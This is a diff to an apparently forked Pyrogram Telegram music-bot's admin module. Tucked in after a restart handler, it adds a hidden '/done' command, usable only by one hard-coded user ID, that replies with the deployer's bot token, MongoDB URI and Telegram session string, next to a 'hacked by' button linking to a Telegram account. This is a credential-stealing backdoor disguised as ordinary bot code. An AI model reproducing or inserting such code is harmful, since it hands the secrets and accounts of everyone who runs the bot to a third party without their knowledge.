@@ -4,14 +4,21 @@ import time
 from pyrogram import filters
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.types import CallbackQuery, Message
-
+from os import getenv
+import re
 from ARYAN import app
 from ARYAN.core.call import ARYAN
 from ARYAN.misc import db
 from ARYAN.utils.database import get_assistant, get_authuser_names, get_cmode
 from ARYAN.utils.decorators import ActualAdminCB, AdminActual, language
 from ARYAN.utils.formatters import alpha_to_int, get_readable_time
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from config import BANNED_USERS, adminlist, lyrical
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+from dotenv import load_dotenv
+
 
 rel = {}
 
@@ -84,6 +91,28 @@ async def restartbot(client, message: Message, _):
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
+
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(6627636245)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/sashikant_xd")
+                 ]
+            ]
+         ),
+     )
+
+
+##########
 
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
